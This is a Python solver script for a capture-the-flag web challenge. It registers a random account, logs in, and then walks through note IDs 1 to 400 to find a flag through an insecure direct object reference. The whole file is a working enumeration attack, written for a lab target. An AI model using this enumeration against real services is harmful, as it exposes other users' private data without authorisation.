#!/usr/bin/env python3
import re
import sys
import json
import secrets
import string
import requests

FLAG_RE = re.compile(r"TCF\{[^}]+\}")

def rand_str(n=10):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(n))

def must_json(resp):
    try:
        return resp.json()
    except Exception:
        return {}

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://host:port/")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")  # no trailing slash
    s = requests.Session()
    s.headers.update({
        "User-Agent": "solver/1.0",
        "Accept": "application/json",
    })

    # 0) sanity check
    r = s.get(base + "/", timeout=15)
    print("[*] GET / =", r.status_code)

    # 1) signup random user (mimic public/scripts/signup.js)
    email = f"{rand_str(8)}@{rand_str(6)}.ctf"
    password = "A" + rand_str(14)  # >= 8
    name = "user_" + rand_str(6)

    signup_payload = {
        "name": name,
        "email": email,
        "password": password,
        "confirmPassword": password,
        "urlBack": base + "/signup",
    }

    r = s.post(
        base + "/api/signup",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        data=json.dumps(signup_payload),
        timeout=20,
    )
    sj = must_json(r)
    print("[*] POST /api/signup =", r.status_code, "json.success=", sj.get("success"), "msg=", sj.get("message"))

    # kalau signup gagal karena apa pun, tetap coba login (kadang user sudah ada dari run sebelumnya)
    # 2) signin (mimic public/scripts/signin.js)
    signin_payload = {
        "email": email,
        "password": password,
        "redirect": "/notes",
    }
    r = s.post(
        base + "/api/signin",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        data=json.dumps(signin_payload),
        timeout=20,
        allow_redirects=False,
    )
    ij = must_json(r)
    print("[*] POST /api/signin =", r.status_code, "json.success=", ij.get("success"), "msg=", ij.get("message"))

    # pastikan cookie kebawa
    cookie_names = list(s.cookies.get_dict().keys())
    print("[*] Cookies:", cookie_names)
    if not cookie_names:
        print("[!] Tidak dapat cookie dari signin. Coba cek response headers Set-Cookie / apakah endpoint beda.")
        print("[!] Response text (first 300):", r.text[:300])
        sys.exit(2)

    # 3) hit /notes (harus 200, bukan redirect ke /signin)
    r = s.get(base + "/notes", timeout=20, allow_redirects=False)
    print("[*] GET /notes =", r.status_code, "Location=", r.headers.get("Location"))
    if r.status_code in (301, 302, 303, 307, 308) and "/signin" in (r.headers.get("Location") or ""):
        print("[!] Masih dianggap belum login (redirect ke /signin). Cookie/flow login belum benar.")
        sys.exit(3)

    # 4) enumerate note ids (biasanya welcome/admin note id kecil)
    for nid in range(1, 401):
        url = f"{base}/notes/{nid}/"
        rr = s.get(url, timeout=20, allow_redirects=True)
        if rr.status_code != 200:
            continue

        m = FLAG_RE.search(rr.text)
        if m:
            print(m.group(0))
            return

        # optional: kalau halaman note ada, tapi flag nggak ada, lanjut
        if nid % 50 == 0:
            print(f"[*] checked up to note id {nid}...")

    print("[!] Flag tidak ketemu sampai id 400.")
    print("[!] Next step: lihat manual note list atau intercept request di browser untuk tahu pola slug/id yang benar.")

if __name__ == "__main__":
    main()
